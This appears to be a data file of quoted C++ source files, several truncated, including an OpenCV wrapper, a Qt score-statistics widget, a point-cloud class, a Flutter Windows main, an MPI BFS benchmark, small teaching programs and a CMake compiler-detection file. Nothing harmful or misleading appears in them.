    "#include \"opencv.hpp\"\n#include <stdbool.h>\n#include <opencv2/highgui.hpp>\n#include <opencv2/imgproc.hpp>\n\nopencv_mat opencv_mat_create(int width, int height, int type)\n{\n    return new cv::Mat(height, width, type);\n}\n\nopencv_mat opencv_mat_create_from_data(int width, int height, int type, void* data, size_t data_len)\n{\n    size_t total_size = width * height * CV_ELEM_SIZE(type);\n    if (total_size > data_len) {\n        return NULL;\n    }\n    auto mat = new cv::Mat(height, width, type, data);\n    mat->datalimit = (uint8_t*)data + data_len;\n    return mat;\n}\n\nopencv_mat opencv_mat_create_empty_from_data(int length, void* data)\n{\n    // this is slightly sketchy - what we're going to do is build a 1x0 matrix\n    // and then set its data* properties to reflect the capacity (given by length arg here)\n    // this tells opencv internally that the Mat can store more but has nothing in it\n    // this is directly analogous to Go's len and cap\n    auto mat = new cv::Mat(0, 1, CV_8U, data);\n\n    mat->datalimit = mat->data + length;\n\n    return mat;\n}\n\nbool opencv_mat_set_row_stride(opencv_mat mat, size_t stride)\n{\n    auto m = static_cast<cv::Mat*>(mat);\n    if (m->step == stride) {\n        return true;\n    }\n    size_t width = m->cols;\n    size_t height = m->rows;\n    auto type = m->type();\n    auto width_stride = width * CV_ELEM_SIZE(type);\n    if (stride < width_stride) {\n        return false;\n    }\n    if (m->step != width_stride) {\n        // refuse to set the stride if it's already set\n        // the math for that is confusing and probably unnecessary to figure out\n        return false;\n    }\n    size_t total_size = stride * height;\n    if ((m->datastart + total_size) > m->datalimit) {\n        // don't exceed end of data array\n        return false;\n    }\n    m->step = stride;\n    return true;\n}\n\nvoid opencv_mat_release(opencv_mat mat)\n{\n    auto m = static_cast<cv::Mat*>(mat);\n    delete m;\n}\n\nint opencv_type_depth(int type)\n{\n    return CV_ELEM_SIZE1(type) * 8;\n}\n\nint opencv_type_channels(int type)\n{\n    return CV_MAT_CN(type);\n}\n\nint opencv_type_convert_depth(int t, int depth)\n{\n    return CV_MAKETYPE(depth, CV_MAT_CN(t));\n}\n\nopencv_decoder opencv_decoder_create(const opencv_mat buf)\n{\n    auto mat = static_cast<const cv::Mat*>(buf);\n    cv::ImageDecoder* d = new cv::ImageDecoder(*mat);\n    if (d->empty()) {\n        delete d;\n        d = NULL;\n    }\n    return d;\n}\n\nconst char* opencv_decoder_get_description(const opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->getDescription().c_str();\n}\n\nvoid opencv_decoder_release(opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    delete d_ptr;\n}\n\nbool opencv_decoder_read_header(opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->readHeader();\n}\n\nint opencv_decoder_get_width(const opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->width();\n}\n\nint opencv_decoder_get_height(const opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->height();\n}\n\nint opencv_decoder_get_pixel_type(const opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->type();\n}\n\nint opencv_decoder_get_orientation(const opencv_decoder d)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    return d_ptr->orientation();\n}\n\nbool opencv_decoder_read_data(opencv_decoder d, opencv_mat dst)\n{\n    auto d_ptr = static_cast<cv::ImageDecoder*>(d);\n    auto* mat = static_cast<cv::Mat*>(dst);\n    return d_ptr->readData(*mat);\n}\n\nopencv_encoder opencv_encoder_create(const char* ext, opencv_mat dst)\n{\n    auto* mat = static_cast<cv::Mat*>(dst);\n    return new cv::ImageEncoder(ext, *mat);\n}\n\nvoid opencv_encoder_release(opencv_encoder e)\n{\n    auto e_ptr = static_cast<cv::ImageEncoder*>(e);\n    delete e_ptr;\n}\n\nbool opencv_encoder_write(opencv_encoder e, const opencv_mat src, const int* opt, size_t opt_len)\n{\n    auto e_ptr = static_cast<cv::ImageEncoder*>(e);\n    auto mat = static_cast<const cv::Mat*>(src);\n    std::vector<int> params;\n    for (size_t i = 0; i < opt_len; i++) {\n        params.push_back(opt[i]);\n    }\n    return e_ptr->write(*mat, params);\n};\n\nvoid opencv_mat_resize(const opencv_mat src,\n                       opencv_mat dst,\n                       int width,\n                       int height,\n                       int interpolation)\n{\n    cv::resize(*static_cast<const cv::Mat*>(src),\n               *static_cast<cv::Mat*>(dst),\n               cv::Size(width, height),\n               0,\n               0,\n               interpolation);\n}\n\nopencv_mat opencv_mat_crop(const opencv_mat src, int x, int y, int width, int height)\n{\n    auto ret = new cv::Mat;\n    *ret = (*static_cast<const cv::Mat*>(src))(cv::Rect(x, y, width, height));\n    return ret;\n}\n\nvoid opencv_mat_orientation_transform(CVImageOrientation orientation, opencv_mat mat)\n{\n    auto cvMat = static_cast<cv::Mat*>(mat);\n    cv::Orienta",
    "#include \"statisticwidget.h\"\n#include \"ui_statisticwidget.h\"\n\n#include <QPieSeries>\n#include <QSqlQuery>\n#include <QValueAxis>\n#include <QLineSeries>\n#include <QMap>\n#include <QBarSeries>\n#include <QBarSet>\n#include <QBarCategoryAxis>\n#include <QSqlRecord>\n\n\nStatisticWidget::StatisticWidget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::StatisticWidget)\n{\n    ui->setupUi(this);\n    ui->pie->setChart(new QChart);\n    ui->line->setChart(new QChart);\n    ui->bar->setChart(new QChart);\n    reloadCharts();\n}\n\nStatisticWidget::~StatisticWidget()\n{\n    delete ui;\n}\n\nvoid StatisticWidget::initPieChart() {\n\n    \n    QChart *chart = ui->pie->chart();\n    chart->removeAllSeries();\n\n    auto *pieSeries = new QPieSeries;\n\n    QVector<int> counts = {\n            totalCountWithin(0, 60),\n            totalCountWithin(60, 70),\n            totalCountWithin(70, 80),\n            totalCountWithin(80, 90),\n            totalCountWithin(90, 100)\n    };\n    QStringList list = {\n            \"\u4e0d\u53ca\u683c\",\n            \"\u53ca\u683c\",\n            \"\u4e2d\u7b49\",\n            \"\u826f\u597d\",\n            \"\u4f18\u79c0\",\n    };\n\n    for (int i = 0; i < counts.size(); ++i) {\n        pieSeries->append(list[i], counts[i]);\n    }\n    for (int i = 0; i < counts.size(); ++i) {\n        auto *slice = pieSeries->slices()[i];\n        if (slice->value() != 0) {\n            slice->setLabel(QString(\"%1\uff1a%2\u4eba\").arg(list[i]).arg(counts[i]));\n            slice->setLabelVisible(true);\n        } else {\n            slice->setLabelVisible(false);\n        }\n    }\n    chart->addSeries(pieSeries);\n    chart->setTitle(\"\u5206\u6570\u6bd4\u4f8b\");\n    chart->legend()->setAlignment(Qt::AlignLeft);\n    chart->setAnimationOptions(QChart::SeriesAnimations);\n\n\n}\n\nvoid StatisticWidget::initLineChart() {\n\n\n    \n    QChart *pChart = ui->line->chart();\n    auto *chart = new QChart();\n    ui->line->setChart(chart);\n    delete pChart;\n\n\n\n    auto axisX = new QValueAxis();\n    auto axisY = new QValueAxis();\n\n\n    axisX->setRange(0, 100);\n    axisX->setTitleText(\"\u5206\u6570\");\n    axisY->setRange(0, totalCount());\n    axisY->setLabelFormat(\"%d\");\n    axisY->setTitleText(\"\u4eba\u6570\");\n\n    chart->addAxis(axisX, Qt::AlignBottom);\n    chart->addAxis(axisY, Qt::AlignLeft);\n\n    auto *lineSeries = new QLineSeries();\n    lineSeries->setName(\"\u5206\u6bb5\u4eba\u6570\");\n    chart->addSeries(lineSeries);\n    lineSeries->attachAxis(axisX);\n    lineSeries->attachAxis(axisY);\n\n    QMap<double, int> map = averageScores();\n    for (const auto &item: map.asKeyValueRange()) {\n//        qDebug() << item;\n        lineSeries->append(item.first, item.second);\n    }\n    chart->setAnimationOptions(QChart::SeriesAnimations);\n    chart->setTitle(\"\u5206\u6bb5\u4eba\u6570\");\n\n}\n\nvoid StatisticWidget::initBarChart(int i) {\n    \n    QChart *pChart = ui->bar->chart();\n    auto *chart = new QChart;\n    ui->bar->setChart(chart);\n    delete pChart;\n    chart->removeAllSeries();\n\n\n    QVector<int> counts = {\n            totalCountPreSubjectWithin(0, 19, i),\n            totalCountPreSubjectWithin(20, 39, i),\n            totalCountPreSubjectWithin(40, 59, i),\n//            totalCountPreSubjectWithin(50, 60, 1),\n            totalCountPreSubjectWithin(60, 79, i),\n//            totalCountPreSubjectWithin(70, 80, 1),\n            totalCountPreSubjectWithin(80, 89, i),\n            totalCountPreSubjectWithin(90, 100, i)\n    };\n    \n    QStringList list = {\n            \"0-19\",\n            \"20-39\",\n            \"40-59\",\n            \"60-79\",\n            \"80-89\",\n            \"90-100\",\n    };\n\n    auto *barSeries = new QBarSeries;\n    auto *barSet = new QBarSet(\"\u4eba\u6570\");\n    barSeries->append(barSet);\n    barSeries->setName(\"\u5206\u6bb5\u4eba\u6570\");\n\n    for (const auto &item: counts){\n        barSet->append(item);\n    }\n\n    auto *axisY = new QValueAxis;\n    axisY->setRange(0, totalCountPreSubject(i));\n    axisY->setTitleText(\"\u4eba\u6570\");\n    axisY->setLabelFormat(\"%d\");\n    auto *categoryAxis = new QBarCategoryAxis;\n    categoryAxis->setTitleText(\"\u5206\u6bb5\");\n    categoryAxis->append(list);\n\n    chart->addSeries(barSeries);\n    chart->addAxis(axisY, Qt::AlignLeft);\n    chart->addAxis(categoryAxis, Qt::AlignBottom);\n\n    barSeries->attachAxis(axisY);\n    barSeries->attachAxis(categoryAxis);\n    barSeries->setLabelsVisible(true);\n//    barSeries->setLabelsPosition(QAbstractBarSeries::LabelsOutsideEnd);\n\n\n    chart->setAnimationOptions(QChart::SeriesAnimations);\n    chart->setTitle(getSubjectName(i) + \"\u7684\u4eba\u6570\u5206\u5e03\");\n//    chart->legend()->setAlignment(Qt::AlignBottom);\n\n    \n}\n\nvoid StatisticWidget::reloadCharts() {\n\n    auto subjects = getSubjectNames();\n    ui->ComboBox->clear();\n    for (const auto &item: subjects.asKeyValueRange()) {\n        ui->ComboBox->addItem(item.first, item.second);\n    }\n    int id = ui->ComboBox->currentData().toInt();\n    initPieChart();\n    initLineChart();\n    initBarChart(id);\n\n    ui->average->setText(QString(\"<h2>\u5e73\u5747\u5206\uff1a%1</h2>\").arg(subjectSum(id)));\n    ui->total->setText(QString(\"<h3>\u603b\u4eba\u6570\uff1a%1</h3>\").arg(subjectAverage(id)));\n    ui->listWidget->clear();\n    ui->listWidget->addItems(getProjectScores(id));\n}\n\n\n\nint StatisticWidget::totalCoun",
    "#include \"CgPointCloud.h\"\n#include \"CgBase/CgEnums.h\"\n#include \"CgUtils/ObjLoader.h\"\n#include <glm/gtc/matrix_transform.hpp>\n#include <algorithm>\n\n\nCgPointCloud::CgPointCloud():\nCgPointCloud::CgPointCloud(51)\n{\n\n}\n\nCgPointCloud::CgPointCloud(int id):\nm_type(Cg::PointCloud),\nm_id(id)\n{\n\n    m_vertices.push_back(glm::vec3(0.0,0.0,0.0));\n    m_vertex_normals.push_back(glm::vec3(0.0,0.0,1.0));\n    m_vertex_colors.push_back(glm::vec3(0.0,0.0,1.0));\n\n    calculateSplatOrientations();\n\n}\n\n\nCgPointCloud::~CgPointCloud()\n{\n    m_vertices.clear();\n    m_vertex_normals.clear();\n    m_vertex_colors.clear();\n    m_splat_indices.clear();\n}\n\n\nvoid CgPointCloud::calculateSplatOrientations()\n{\n  // calculate local coordinate system for splats (arbitrary orientation of ellipse in plane)\n  // replace this if you have the real coordinate system, use up vector = y-Axis of your local coordinate system instead of getPerpendicularVector(...)\n\n  m_splat_orientations.clear();\n  m_splat_scaling.clear();\n  m_splat_indices.clear();\n\n  for(unsigned int i=0;i<m_vertices.size();i++)\n    {\n      glm::mat4 lookAt_matrix(glm::lookAt(glm::vec3(m_vertices[i]),glm::vec3(m_vertices[i]-m_vertex_normals[i]),getPerpendicularVector(m_vertex_normals[i])));\n      m_splat_orientations.push_back(lookAt_matrix);\n      m_splat_scaling.push_back(glm::vec2(0.02,0.005));\n\n      // use all points for splatting by default\n      m_splat_indices.push_back(i);\n    }\n\n\n}\n\n\nvoid CgPointCloud::init( std::string filename, bool cheat_normals)\n{\n    m_vertices.clear();\n    m_vertex_normals.clear();\n    m_vertex_colors.clear();\n    m_splat_orientations.clear();\n    m_splat_scaling.clear();\n    m_splat_indices.clear();\n\n    // load obj File\n    ObjLoader loader;\n    loader.load(filename);\n    loader.getPositionData(m_vertices);\n\n\n    // do this for cheating with the normals\n    // you need to replace this by a normal estimation algorithm\n    if(cheat_normals)\n      loader.getNormalData(m_vertex_normals);\n\n\n    // calculate local coordinate system for splats (arbitrary orientation of ellipse in plane)\n    // replace this if you have the real coordinate system, use up vector = y-Axis of your local coordinate system instead of getPerpendicularVector(...)\n\n    calculateSplatOrientations();\n\n    //add a standard color for each point if lighting turned off\n    for(unsigned int i=0;i<m_vertices.size();i++)\n      {\n          m_vertex_colors.push_back(glm::vec3(0.0,1.0,0.0));\n      }\n\n\n    //test of getNeartestNeighbors(..) method\n    // generates blue dots on the tail of the bunny\n\n    unsigned int k=50;\n    std::vector<int> neighbors = getNearestNeighbors(0,k);\n\n    for(unsigned int i=0;i<k;i++)\n      {\n        m_vertex_colors[neighbors[i]]=glm::vec3(0.0,0.0,1.0);\n      }\n}\n\n\nstd::vector<int> CgPointCloud::getNearestNeighbors(int current_point,unsigned int k)\n{\n\n  glm::vec3 q= m_vertices[current_point];\n\n  std::vector<std::pair<double,int>> distances;\n\n  // very inefficient, just to show that it works for rendering colored neighborhood\n  // use min heap for real purposes\n\n\n  for(unsigned int i=0;i<m_vertices.size();i++)\n    {\n      double dist=glm::distance(m_vertices[i],q);\n\n      distances.push_back(std::make_pair(dist,i));\n    }\n\n    std::sort(distances.begin(),distances.end());\n\n    std::vector<int> erg;\n\n   for(unsigned int i=0;i<k;i++)\n    {\n       erg.push_back(distances[i].second);\n     }\n\n    return erg;\n  }\n\n\n// calculates an arbitrary verctor perpendicular to the given one\nglm::vec3 CgPointCloud::getPerpendicularVector(glm::vec3 arg)\n{\n  if((arg[0]==0.0)&&(arg[1]==0.0))\n    {\n    if(arg[2]==0.0)\n      return glm::vec3(0.);\n\n    return glm::vec3(0.0,1.0,0.0);\n    }\n  return glm::normalize(glm::vec3(-arg[1],arg[0],0.0));\n}\n\n\n\n\nconst glm::vec3 CgPointCloud::getCenter() const\n{\n  glm::vec3 center(0.);\n  for(unsigned int i=0;i<m_vertices.size();i++)\n    {\n      center+=m_vertices[i];\n    }\n  center/=(double)m_vertices.size();\n  return center;\n}\n\nconst std::vector<glm::vec2>& CgPointCloud::getSplatScalings() const\n{\n  return m_splat_scaling;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"contact_info\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#if defined(xxxxx-6_EXAMPLES_USE_BOOST)\n#include \"bfs/bindings/boost.hpp\"\n#endif\n\n#include <spdlog/fmt/ranges.h>\n#include <spdlog/pattern_formatter.h>\n#include <spdlog/spdlog.h>\n\n#include <CLI/CLI.hpp>\n#include <xxxxx-3ing/collectives/allreduce.hpp>\n#include <xxxxx-3ing/collectives/alltoall.hpp>\n#include <xxxxx-3ing/collectives/reduce.hpp>\n#include <xxxxx-3ing/communicator.hpp>\n#include <xxxxx-3ing/environment.hpp>\n#include <xxxxx-3ing/measurements/printer.hpp>\n#include <xxxxx-3ing/measurements/timer.hpp>\n#include <xxxxx-3ing/mpi_datatype.hpp>\n#include <xxxxx-3ing/plugin/alltoall_grid.hpp>\n#include <xxxxx-3ing/plugin/alltoall_sparse.hpp>\n#include <memory>\n#include <ranges>\n\n#include \"bfs/bfs_algorithm.hpp\"\n#include \"bfs/bindings/xxxxx-3ing.hpp\"\n#include \"bfs/bindings/xxxxx-3ing_flattened.hpp\"\n#include \"bfs/bindings/xxxxx-3ing_grid.hpp\"\n#include \"bfs/bindings/xxxxx-3ing_sparse.hpp\"\n#include \"bfs/bindings/mpi.hpp\"\n#include \"bfs/bindings/mpi_neighborhood.hpp\"\n#include \"bfs/bindings/mpi_neighborhood_dynamic.hpp\"\n#include \"bfs/bindings/mpl.hpp\"\n#include \"bfs/bindings/rwth_mpi.hpp\"\n#include \"bfs/common.hpp\"\n#include \"bfs/utils.hpp\"\n\nenum class Algorithm {\n  boost,\n  xxxxx-3ing,\n  xxxxx-3ing_flattened,\n  xxxxx-3ing_grid,\n  xxxxx-3ing_sparse,\n  mpi,\n  mpi_neighborhood,\n  mpi_neighborhood_dynamic,\n  mpl,\n  rwth_mpi\n};\n\nstd::string to_string(const Algorithm& algorithm) {\n  switch (algorithm) {\n    case Algorithm::boost:\n      return \"boost\";\n    case Algorithm::xxxxx-3ing:\n      return \"xxxxx-3ing\";\n    case Algorithm::xxxxx-3ing_flattened:\n      return \"xxxxx-3ing_flattened\";\n    case Algorithm::xxxxx-3ing_grid:\n      return \"xxxxx-3ing_grid\";\n    case Algorithm::xxxxx-3ing_sparse:\n      return \"xxxxx-3ing_sparse\";\n    case Algorithm::mpi:\n      return \"mpi\";\n    case Algorithm::mpi_neighborhood:\n      return \"mpi_neighborhood\";\n    case Algorithm::mpi_neighborhood_dynamic:\n      return \"mpi_neighborhood_dynamic\";\n    case Algorithm::mpl:\n      return \"mpl\";\n    case Algorithm::rwth_mpi:\n      return \"rwth_mpi\";\n    default:\n      throw std::runtime_error(\"unsupported algorithm\");\n  };\n}\n\nauto dispatch_bfs_algorithm(Algorithm algorithm) {\n  using namespace graph;\n  switch (algorithm) {\n#if defined(xxxxx-6_EXAMPLES_USE_BOOST)\n    case Algorithm::boost: {\n      using Frontier = bfs_boost::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n#endif\n    case Algorithm::xxxxx-3ing: {\n      using Frontier = bfs_xxxxx-3ing::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::xxxxx-3ing_flattened: {\n      using Frontier = bfs_xxxxx-3ing_flattened::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::xxxxx-3ing_grid: {\n      using Frontier = bfs_xxxxx-3ing_grid::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::xxxxx-3ing_sparse: {\n      using Frontier = bfs_xxxxx-3ing_sparse::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::mpi: {\n      using Frontier = bfs_mpi::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::mpi_neighborhood: {\n      using Frontier = bfs_mpi_neighborhood::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::mpi_neighborhood_dynamic: {\n      using Frontier = bfs_mpi_neighborhood_dynamic::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::mpl: {\n      using Frontier = bfs_mpl::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    case Algorithm::rwth_mpi: {\n      using Frontier = bfs_rwth_mpi::BFSFrontier;\n      return bfs::bfs<Frontier>;\n    }\n    default:\n      throw std::runtime_error(\"unsupported algorithm\");\n  };\n}\n\nvoid log_results(std::string const& json_output_path, std::size_t iterations,\n                 std::string const& algorithm,\n                 std::string const& kagen_option_string, size_t max_bfs_level,\n                 size_t seed) {\n  std::unique_ptr<std::ostream> output_stream;\n  if (xxxxx-3ing::comm_world().rank() == 0) {\n    if (json_output_path == \"stdout\") {\n      output_stream = std::make_unique<std::ostream>(std::cout.rdbuf());\n    } else {\n      std::ofstream file_output(json_output_path);\n      output_stream = std::make_unique<std::ofstream>(std::move(file_output));\n    }\n    *output_stream << \"{\\n\";\n  }\n  xxxxx-3ing::measurements::timer().aggregate_and_print(\n      xxxxx-3ing::measurements::SimpleJsonPrinter<>{*output_stream});\n  if (mpl::environment::comm_world().rank() == 0) {\n    *output_stream << \",\\n\";\n    *output_stream << \"\\\"info\\\": {\\n\";\n    *output_stream << \"  \\\"iterations\\\": \"\n                   << \"\\\"\" << iterations << \"\\\",\\n\";\n    *output_stream << \"  \\\"algorithm\\\": \"\n                   << \"\\\"\" << algorithm << \"\\\",\\n\";\n    *output_stream << \"  \\\"graph\\\": \"\n                   << \"\\\"\" << kagen_option_string << \"\\\",\\n\";\n    *output_stream << \"  \\\"p\\\": \" << mpl::environment::comm_world().size()\n                   << \",\\n\";\n    *output_stream << \"  \\\"max_bfs_level\\\": \" << max_bfs_level << \",\\n\";\n    *output_stream << \"  \\\"se",
    "#include <iostream>\r\n#include <vector>\r\n#include <iomanip>\r\n\r\n// This class simulates a page frame table, commonly used in memory management.\r\nclass PageFrameTable {\r\nprivate:\r\n    // We're using a vector as our table. Initially, all values are set to -1.\r\n    std::vector<int> table;\r\n    const int PAGE_SIZE = 256;  // Standard size for pages.\r\n\r\npublic:\r\n    // Constructor: sets up our table with the specified number of pages.\r\n    explicit PageFrameTable(size_t numPages) : table(numPages, -1) {}\r\n\r\n    // Sets a page frame mapping: links a page number with a frame number.\r\n    void setPageFrameMapping(int pageNumber, int frameNumber) {\r\n        // Checking if the page number is valid before setting the mapping.\r\n        if (pageNumber >= 0 && pageNumber < table.size()) {\r\n            table[pageNumber] = frameNumber;\r\n        } else {\r\n            // Oops, that page number is out of range.\r\n            std::cerr << \"Error: Page number out of bounds.\" << std::endl;\r\n        }\r\n    }\r\n\r\n    // Gets the frame number associated with a page number.\r\n    int getFrameNumber(int pageNumber) const {\r\n        // Simple lookup: returns the frame number or -1 if it's not found.\r\n        if (pageNumber >= 0 && pageNumber < table.size()) {\r\n            return table[pageNumber];\r\n        } else {\r\n            // No mapping found: we've got a page fault.\r\n            return -1;\r\n        }\r\n    }\r\n\r\n    // Converts a logical address to a physical one and shows the details.\r\n    void translateAddressAndPrintDetails(unsigned int logicalAddress) {\r\n        // Breaking down the logical address to find the page number and offset.\r\n        unsigned int pageNumber = logicalAddress / PAGE_SIZE;\r\n        unsigned int offset = logicalAddress % PAGE_SIZE;\r\n        int frameNumber = getFrameNumber(pageNumber);\r\n\r\n        // Displaying the conversion details.\r\n        std::cout << \"Logical Address: 0x\" << std::hex << std::setw(4) << std::setfill('0') << logicalAddress\r\n                  << \" => Page Number: 0x\" << std::hex << std::setw(2) << std::setfill('0') << pageNumber\r\n                  << \", Offset: 0x\" << std::hex << std::setw(2) << std::setfill('0') << offset;\r\n\r\n        // Finally, show the physical address or a page fault message.\r\n        if (frameNumber != -1) {\r\n            unsigned int physicalAddress = (frameNumber * PAGE_SIZE) + offset;\r\n            std::cout << \" => Physical Address: 0x\" << std::hex << std::setw(4) << std::setfill('0') << physicalAddress << std::endl;\r\n        } else {\r\n            std::cerr << \" - Page fault: Page not in memory!\" << std::endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    // Set up a page frame table for our simulation, here with 256 pages.\r\n    PageFrameTable table(256);\r\n\r\n    // Establishing some page-to-frame mappings for demonstration purposes.\r\n    table.setPageFrameMapping(0x3A, 13);\r\n    table.setPageFrameMapping(0xAB, 43);\r\n    table.setPageFrameMapping(0x56, 21);\r\n\r\n    // Time to translate some logical addresses and show what happens.\r\n    unsigned int logicalAddresses[] = {0x3A7F, 0xABCD, 0x5678};\r\n    for (unsigned int logicalAddress : logicalAddresses) {\r\n        table.translateAddressAndPrintDetails(logicalAddress);\r\n    }\r\n\r\n    // All done here.\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <vector>\n\nusing namespace std;\n\nclass Student {\nprivate:\n    string name;\n    string hobby;\n\npublic:\n    Student(const string& name, const string& hobby) : name(name), hobby(hobby) {}\n\n    string getName() const {\n        return name;\n    }\n\n    string getHobby() const {\n        return hobby;\n    }\n};\n\n\nvoid selectGroup(Student* students, int size) {\n    unordered_map<string, vector<string>> groups;\n    for (int i = 0; i < size; ++i) {\n        string hobby = students[i].getHobby();\n        groups[hobby].push_back(students[i].getName());\n    }\n\n    for (const auto& pair : groups) {\n        cout << \"Group with hobby '\" << pair.first << \"':\" << endl;\n        for (const auto& student : pair.second) {\n            cout << student << endl;\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n   Student students[] = {\n        Student(\"Ivan\", \"music\"),\n        Student(\"Max\", \"gym\"),\n        Student(\"Alex\", \"gym\"),\n        Student(\"Masha\", \"music\"),\n        Student(\"Pasha\", \"art\"),\n        Student(\"Vova\", \"gym\"),\n    };\n\n    selectGroup(students, sizeof(students) / sizeof(students[0]));\n \n    return 0;\n}\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nclass node {\npublic:\n    node *next;\n    int data;\n\n    node(int val) {\n        data = val;\n        next = nullptr;\n    }\n\n};\n\nclass linkedList {\npublic:\n    node *head;\n\n    linkedList() {\n        head = nullptr;\n    }\n\n    void add(int val) {\n        node *newNode = new node(val);\n        if (head == nullptr){\n            head = newNode;\n            return;\n        }\n        node* temp = head;\n        while(temp->next != nullptr){\n            temp = temp->next;\n        }\n        temp->next = newNode;\n    }\n\n    void insertAt(int pos, int val) {\n        if (pos < 0) {\n            cout << \"invalid position\\n\";\n            return;\n        }\n        node *newNode = new node(val);\n        node *temp = head;\n        for (int i = 0; i < pos - 2 && temp != nullptr; ++i) {\n            temp = temp->next;\n        }\n        if (temp == nullptr) {\n            cout << \"out of range position\\n\";\n            return;\n        }\n        newNode->next = temp->next;\n        temp->next = newNode;\n\n    }\n\n    void deleteNode(int val){\n        if(head== nullptr){\n            cout<<\"list is empty\\n\";\n        }\n        if(head->data==val){\n            cout<<\"deleted \"<<val<<el;\n            node *temp = head;\n            head = head->next;\n            delete temp;\n            return;\n        }\n        node* temp = head;\n        while(temp->next!= nullptr && temp->next->data!=val){\n            temp = temp->next;\n        }\n        if (temp->next == nullptr){\n            cout<<\"val \"<< val<< \" not found\\n\";\n            return;\n        }\n        node* toDEL = temp->next;\n        temp->next = temp->next->next;\n        delete toDEL;\n        cout<<\"deleted \"<<val<<el;\n    }\n\n    void print() const {\n        node* temp = head;\n        while (temp != nullptr){\n            cout<<temp->data<<' ';\n            temp = temp->next;\n        }\n        cout<<el;\n    }\n};\n\nint main() {\n    linkedList x;\n    x.add(1);\n    x.add(2);\n    x.add(7);\n    x.add(12);\n    x.add(2);\n    x.print();\n    x.insertAt(3,33);\n    x.print();\n    x.deleteNode(2);\n    x.print();\n    x.deleteNode(4);\n    x.print();\n}\n\n\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n# if defined(__INTEL_COMPILER_UPDATE)\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n# else\n#  define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n  /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID 